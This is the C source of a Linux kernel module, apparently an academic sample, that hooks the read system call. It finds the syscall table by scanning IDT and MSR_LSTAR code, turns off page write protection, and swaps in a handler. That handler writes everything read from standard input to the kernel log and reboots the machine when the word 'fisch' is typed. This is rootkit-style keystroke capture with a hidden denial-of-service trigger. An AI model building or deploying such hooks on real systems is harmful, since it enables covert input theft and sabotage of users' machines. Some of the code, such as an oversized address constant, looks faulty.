#include <linux/moduleloader.h>
#include <linux/unistd.h>
#include <linux/reboot.h>
#include "../sysmap.h"		// for sys_call_table address this is Device spesific -- Not anymore! now we will do this more fancy!
#include <asm/atomic.h>
#include <linux/delay.h>

#include <asm/msr-index.h>
#include <linux/types.h>
#include <linux/string.h>

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module hijacking the read"

int z = 0;
atomic_t in_original_read;


unsigned long *sys_call_table;// = (unsigned long*) MAP_sys_call_table; // Address of the Syscall table from sysmap

asmlinkage int (*original_read) (unsigned int, char __user *, size_t);

void* memmem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen)
{
	if (   !haystack 
			|| !haystacklen
			|| !needle 
			|| !needlelen
			|| haystacklen < needlelen) {
		return NULL;
	}

	while (   haystacklen >= needlelen
			&& haystacklen-- 
			&& memcmp(haystack, needle, needlelen)) {
		haystack++;
		printk("%x; %x\n",haystack, *(uint8_t *) haystack);
	}

	return (haystacklen >= needlelen) ? (void*) haystack : NULL;
}



asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
{
	int i;

	atomic_inc(&in_original_read);
	if( fd == 0 )		// reading from stdIn
	{
		i = original_read(fd, buf, count);
		printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
		switch(z) {		// search for input pattern
			case 0:
				if(buf[0] == 'f') {
					z=1;
				}
				else z=0;
				break;
			case 1:
				if(buf[0] == 'i'){
					z=2;
				}
				else z=0;
				break;
			case 2:
				if(buf[0] == 's'){
					z=3;
				}
				else z=0;
				break;
			case 3:
				if(buf[0] == 'c'){
					z=4;
				}
				else z=0;
				break;
			case 4:
				if(buf[0] == 'h'){
					//printk("found!\n");					// Found our magic pattern "fisch" from stdin
					kernel_restart(NULL);					// Restart the system
					// panic("Forced Panic! Go Crazy!");	// Make the kernel panic and crash the system :D
				}
				else z=0;
				break;

		}
		if(z==0) {
			printk("Message: %.*s\n", (int)count, buf);		// Print intersected data
		}
		atomic_dec(&in_original_read);
		return i;
	}
	else {		// read from anything but StdIn
		//atomic_inc(&in_original_read);
		i = original_read(fd, buf, count);
		//atomic_dec(&in_original_read);
		//printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
		atomic_dec(&in_original_read);
		return i;
	}
}

/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}


void findSysCallTable(void)
{
	const int CALLOFF = 100;
	unsigned long sys_call_off, idtAdress, sct = 0;
	char* p;
	char sc_asm[CALLOFF];
	unsigned i;
	char tester;
	int state = 0;
	struct {
		unsigned short limit;
		unsigned int base;
	} __attribute__ ((packed)) idtr;

	struct {
		unsigned short off1;
		unsigned short sel;
		unsigned char none,flags;
		unsigned short off2;
	} __attribute__ ((packed)) idt;


	printk("in findSys\n");

	/* ask the processor for the idt address and store it in idtr */
	asm volatile("sidt %0" : "=m" (idtr));	

	printk("after Nulltests \n");
	printk("base: %x\n", idtr.base);
	printk("idt: %x\n", &idt);
	if(&idt == 0) {
		printk("aboding idt == 0 \n");
	}
	
	idtAdress = 0xFFFFFFFFFF00000000 | (idtr.base+8*0x80);
	/* read in IDT for int 0x80 (syscall) */
	memcpy(&idt, (char*) idtAdress ,sizeof(idt));
	printk("2\n");
	sys_call_off = 0xFFFFFFFF00000000 | (idt.off2 << 16) | idt.off1;

	printk("Sys_call_of %x, idtAdress %x, *sys_call_off %x, sc_asm %x\n", sys_call_off, idtAdress, *(unsigned long*) sys_call_off, sc_asm);
	memcpy(sc_asm, (char*) sys_call_off, CALLOFF);
	p = (char*)memmem (sc_asm,CALLOFF,"\xff\x14\x85",3);
	/*for (i = 0; i<100 ; i++) {
		if((char) sys_call_off[i] == 0xff)
			state = 1;
		if(state == 1){
			if((char) sys_call_off[i] == 0x14)
				state = 2;
		}
		else if(state == 2)
			if((char) sys_call_off[i] == 0x85){
				p = sys_call_off + i + 1;
				printk("found syscall adress\n");
				break;
			}
	}*/
	if (p){
		sys_call_table = (unsigned long*)(p+3);
		printk("syscall table from int0x80: %lu and from sysmap: %lu\n", *sys_call_table, MAP_sys_call_table);
	}
	else {
		printk("null\n");
		printk("p %lu\n",(unsigned long) p);
	}
	
}

void findSysCallTable64(void)
{
	int i, low, high;
	unsigned char *ptr;
	unsigned long system_call;

	asm volatile("rdmsr" : "=a" (low), "=d" (high) : "c" (MSR_LSTAR));

	system_call = (void*)(((long)high << 32) | low);

	for (ptr = system_call, i = 0; i < 500; i++)  {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
			sys_call_table = (unsigned long*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
			printk("syscall table from rdmsr: %lx and from sysmap: %lx\n", sys_call_table, MAP_sys_call_table);
			return;
		}

		ptr++;
	}
	printk("Syscall Table not found!\n");
	return;

}

static int __init init_mod(void)
{
	printk("Insert Hock\n");
	atomic_set(&in_original_read,0);

	
	findSysCallTable64();

	make_rw((unsigned long)sys_call_table);
	original_read = (void*)*(sys_call_table + __NR_read);
	*(sys_call_table + __NR_read) = (unsigned long)hacked_read;
	make_ro((unsigned long)sys_call_table);
	printk("Hock is running\n");
	return 0;
}

static void __exit  exit_mod(void)
{
	printk("exiting hook\n");
	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_read) = (unsigned long)original_read;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_original_read)!=0) 
	    printk("waiting for instance to be finished\n");
	while(atomic_read(&in_original_read)!=0){
		msleep(10);
	}
	printk("hook is not running anymore\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
